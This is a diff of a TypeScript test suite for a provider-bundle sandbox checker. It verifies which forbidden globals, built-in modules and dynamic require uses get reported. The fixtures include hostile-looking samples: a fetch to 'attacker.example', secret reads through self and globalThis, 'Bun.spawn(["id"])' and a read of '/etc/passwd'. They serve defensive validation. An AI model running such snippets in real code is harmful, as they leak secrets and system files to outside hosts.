@@ -123,7 +123,7 @@ export async function session(process2: { env: Record<string, string> }) {
 		expect(bundle.violations[0]?.message).toContain(RUNTIME_MODULE_ALLOWLIST.join(", "));
 	});
 
-	it("reports only what the entry reaches and keeps, so unreachable or unused code is not judged", async () => {
+	it("reports only what the roots reach and keep, so unreachable or unused code is not judged", async () => {
 		const dir = makeProvider({
 			"index.ts": `import { used } from "./used";
 import type { Stats } from "node:fs";
@@ -134,12 +134,96 @@ export default { used, s: null as Stats | null };
 			"unused-binding.ts": `import { readFile } from "node:fs";\nexport const unusedBinding = () => readFile;\n`,
 			"scripts/record.ts": `import { writeFile } from "node:fs/promises"; await writeFile("x", "y");\n`,
 			"__tests__/a.test.ts": `export const raw = process.env.FIXTURE_TOKEN;\n`,
-			"start.ts": `const port = process.env.APIFUSE__RUNTIME__PORT;\nawait fetch("http://localhost:" + port);\n`,
+			"dead/leak.ts": `export const leak = fetch("http://attacker.example");\n`,
 		});
 
 		const bundle = await bundleProvider(dir);
 
 		expect(bundle.violations.map(where)).toEqual([]);
+	});
+
+	it("roots the graph at start.ts as well, judging what the bootstrap imports but not the bootstrap itself", async () => {
+		const dir = makeProvider({
+			"index.ts": `import { shared } from "./shared";\nexport default { shared };\n`,
+			"shared.ts": `export const shared = process.env.SHARED_SECRET;\n`,
+			"start.ts": `import { hostname } from "node:os";
+import provider from "./index";
+import { forwarding } from "./stateful-serving";
+const port = process.env.APIFUSE__RUNTIME__PORT;
+const secret = process.env.FORWARDING_SECRET;
+await fetch("http://localhost:" + port + hostname() + secret + provider + forwarding);
+`,
+			"stateful-serving.ts": `export const forwarding = (options: { env?: Record<string, string | undefined> }) => options.env ?? process.env;\n`,
+		});
+
+		const bundle = await bundleProvider(dir);
+
+		expect(bundle.ok).toBe(false);
+		// `shared.ts` is reached from both roots and reported once; everything
+		// inside `start.ts` itself (node:os, FORWARDING_SECRET, fetch) is exempt.
+		expect(bundle.violations.map(where)).toEqual([
+			"global shared.ts:1:23 process.env.SHARED_SECRET",
+			"global stateful-serving.ts:1:101 process.env",
+		]);
+	});
+
+	it("follows the global object through self, global and globalThis to any depth", async () => {
+		const dir = makeProvider({
+			"index.ts": `export const a = self.fetch("http://x");
+export const b = (self as any).process.env.SECRET;
+export const c = (self as any).Bun.spawn(["id"]);
+export const d = (globalThis as any).self.fetch("http://x");
+export const e = (globalThis as any).globalThis.self.process.env.SECRET;
+export const f = (global as any).self.global.Bun.spawn(["id"]);
+export const g = self;
+export const h = typeof self.Bun;
+export const i = self.crypto.randomUUID();
+`,
+		});
+
+		const bundle = await bundleProvider(dir);
+
+		expect(bundle.violations.map(where)).toEqual([
+			"global index.ts:1:18 self.fetch",
+			"global index.ts:2:19 self.process.env.SECRET",
+			"global index.ts:3:19 self.Bun.spawn",
+			"global index.ts:4:19 globalThis.self.fetch",
+			"global index.ts:5:19 globalThis.globalThis.self.process.env.SECRET",
+			"global index.ts:6:19 global.self.global.Bun.spawn",
+			"global index.ts:7:18 self",
+		]);
+	});
+
+	it("reports require and import.meta.require held as values, not only literal calls", async () => {
+		const dir = makeProvider({
+			"index.ts": `const r = require;
+export const a = () => r("node:fs").readFileSync("/etc/passwd");
+export const b = (require as any).main?.require("node:fs");
+const m = import.meta.require;
+export const c = () => m("node:fs");
+export const d = typeof require;
+export const e = require("node:path");
+`,
+		});
+
+		const bundle = await bundleProvider(dir);
+
+		expect(bundle.violations.map(where)).toEqual([
+			"dynamic-import index.ts:1:11 require",
+			"dynamic-import index.ts:3:19 require",
+			"global index.ts:4:11 import.meta.require",
+		]);
+		expect(bundle.violations[0]?.message).toContain("require is used as a value");
+	});
+
+	it("treats every node: specifier as a built-in, including ones this Bun does not ship", async () => {
+		const dir = makeProvider({
+			"index.ts": `import { DatabaseSync } from "node:sqlite";\nexport default DatabaseSync;\n`,
+		});
+
+		const bundle = await bundleProvider(dir);
+
+		expect(bundle.violations.map(where)).toEqual(["module index.ts:1:1 node:sqlite"]);
 	});
 
 	it("follows re-exports, path aliases and side-effect imports into the graph", async () => {
